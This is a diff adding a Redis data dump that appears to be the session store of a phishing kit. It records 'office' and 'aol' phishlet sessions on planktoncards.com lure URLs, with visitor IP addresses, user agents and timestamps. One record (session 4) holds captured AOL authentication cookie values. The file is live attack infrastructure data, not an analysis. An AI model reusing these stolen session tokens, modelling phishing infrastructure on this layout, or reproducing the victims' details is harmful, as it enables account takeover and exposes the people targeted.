@@ -1,0 +1,119 @@
+*3
+$3
+set
+$13
+sessions:0:id
+$2
+13
+*3
+$3
+set
+$10
+sessions:1
+$389
+{"id":1,"phishlet":"office","landing_url":"https://office.planktoncards.com/TVwLlMWC","username":"","password":"","custom":{},"tokens":{},"session_id":"5d3a7e64d33e81b9bd9468a5cf6d1dd6d7502bef7508fe9d4e35c747e21e8d5e","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0","remote_addr":"127.0.0.1","create_time":1739580410,"update_time":1739580410}
+*3
+$3
+set
+$11
+sessions:10
+$424
+{"id":10,"phishlet":"aol","landing_url":"https://ccom.planktoncards.com/zApEuPfs","username":"","password":"","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{},"session_id":"fffec20247920e058ca0ace501c443e918c78918efc9cb64676dd5cc582b17c4","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0","remote_addr":"105.67.130.185","create_time":1739761433,"update_time":1739761433}
+*3
+$3
+set
+$11
+sessions:11
+$423
+{"id":11,"phishlet":"aol","landing_url":"https://ccom.planktoncards.com/zApEuPfs","username":"","password":"","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{},"session_id":"dd8fcf8796ef81534de0bcb6bf2d89668a3dc7cbde2d70763740a4bc8390424c","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0","remote_addr":"193.56.116.41","create_time":1739761543,"update_time":1739761543}
+*3
+$3
+set
+$11
+sessions:12
+$390
+{"id":12,"phishlet":"office","landing_url":"https://office.planktoncards.com/RBGuMmJl","username":"","password":"","custom":{},"tokens":{},"session_id":"c9b3960b75f22943bb88165fc8025399239086e7aaaaedad3d6770cf55ba16a6","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0","remote_addr":"127.0.0.1","create_time":1739820535,"update_time":1739820535}
+*3
+$3
+set
+$10
+sessions:2
+$446
+{"id":2,"phishlet":"office","landing_url":"https://office.planktoncards.com/zvUyHkwZ","username":"","password":"","custom":{},"tokens":{},"session_id":"e20568f0112266918be16859a6522dd37fcdd519ea22f74b76beb0a1663d8777","useragent":"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1","remote_addr":"127.0.0.1","create_time":1739581805,"update_time":1739581805}
+*3
+$3
+set
+$10
+sessions:3
+$446
+{"id":3,"phishlet":"office","landing_url":"https://office.planktoncards.com/zvUyHkwZ","username":"","password":"","custom":{},"tokens":{},"session_id":"cd527683f5688a727c135cce96c8fc07506e54c610c29ea3ae52bd50b95d7162","useragent":"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1","remote_addr":"127.0.0.1","create_time":1739582017,"update_time":1739582017}
+*3
+$3
+set
+$10
+sessions:4
+$903
+{"id":4,"phishlet":"aol","landing_url":"https://ccom.planktoncards.com/HxOTJmAu","username":"","password":"","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{".aol.com":{"A1":{"Name":"A1","Value":"d=AQABBGujsmcCEFrjmmfdfnJuEPaD8wFhn3YFEgEBAQH0s2e8ZyXaxyMA_eMAAA\u0026S=AQAAAikgjPWjPzuzgZ821XJNy9s","Path":"","HttpOnly":true},"A1S":{"Name":"A1S","Value":"d=AQABBGujsmcCEFrjmmfdfnJuEPaD8wFhn3YFEgEBAQH0s2e8ZyXaxyMA_eMAAA\u0026S=AQAAAikgjPWjPzuzgZ821XJNy9s","Path":"","HttpOnly":false},"A3":{"Name":"A3","Value":"d=AQABBGujsmcCEFrjmmfdfnJuEPaD8wFhn3YFEgEBAQH0s2e8ZyXaxyMA_eMAAA\u0026S=AQAAAikgjPWjPzuzgZ821XJNy9s","Path":"","HttpOnly":true}}},"session_id":"a188ef55cc484dd170c62830dc6afc533caac0c9e01a6b5fe08d05e1b48be74f","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0","remote_addr":"105.67.130.185","create_time":1739760494,"update_time":1739760516}
+*3
+$3
+set
+$10
+sessions:5
+$423
+{"id":5,"phishlet":"aol","landing_url":"https://ccom.planktoncards.com/HxOTJmAu","username":"","password":"","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{},"session_id":"5ce0036af54a44a232bcc52c0959d5df7196a29c7f01867205205d25fc1be83b","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0","remote_addr":"105.67.130.185","create_time":1739760623,"update_time":1739760623}
+*3
+$3
+set
+$10
+sessions:6
+$423
+{"id":6,"phishlet":"aol","landing_url":"https://ccom.planktoncards.com/HxOTJmAu","username":"","password":"","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{},"session_id":"bdb63bb51d2c29bdb743349c0c63437f8f84e3905a5353512caf759febc5093c","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0","remote_addr":"105.67.130.185","create_time":1739760834,"update_time":1739760834}
+*3
+$3
+set
+$10
+sessions:7
+$423
+{"id":7,"phishlet":"aol","landing_url":"https://ccom.planktoncards.com/HxOTJmAu","username":"","password":"","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{},"session_id":"694e08a9ddbc98b013b1390c7edace528a42ac8f9be4f262f94bb63fa6cce8ef","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0","remote_addr":"105.67.130.185","create_time":1739760867,"update_time":1739760867}
+*3
+$3
+set
+$10
+sessions:8
+$422
+{"id":8,"phishlet":"aol","landing_url":"https://ccom.planktoncards.com/zApEuPfs","username":"","password":"","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{},"session_id":"0ebca1f0d82241e788ea1e06fff89473e36cc62b8546c43add0ee179f1859d21","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0","remote_addr":"193.56.116.19","create_time":1739761095,"update_time":1739761095}
+*3
+$3
+set
+$10
+sessions:9
+$373
+{"id":9,"phishlet":"aol","landing_url":"https://ccom.planktoncards.com/zApEuPfs","username":"","password":"","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{},"session_id":"eb7d8bbba9b0b1761c18f13b300063e4b8da31cc64ab13ebd5747bc813536596","useragent":"TelegramBot (like TwitterBot)","remote_addr":"149.154.161.198","create_time":1739761280,"update_time":1739761280}
+*3
+$3
+set
+$13
+sessions:0:id
+$2
+14
+*3
+$3
+set
+$11
+sessions:13
+$390
+{"id":13,"phishlet":"office","landing_url":"https://office.planktoncards.com/HiotxTNM","username":"","password":"","custom":{},"tokens":{},"session_id":"c8450acac5d9058964fb89e09b82bab66b76fdd2cb5f4722536b107d6c2f79c9","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0","remote_addr":"127.0.0.1","create_time":1739844447,"update_time":1739844447}
+*3
+$3
+set
+$13
+sessions:0:id
+$2
+15
+*3
+$3
+set
+$11
+sessions:14
+$447
+{"id":14,"phishlet":"office","landing_url":"https://office.planktoncards.com/HiotxTNM","username":"","password":"","custom":{},"tokens":{},"session_id":"12214e4cb60e1b2cb0483d97797cc272a80ec319193c8faffa8f5c39a0497166","useragent":"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1","remote_addr":"127.0.0.1","create_time":1739844527,"update_time":1739844527}
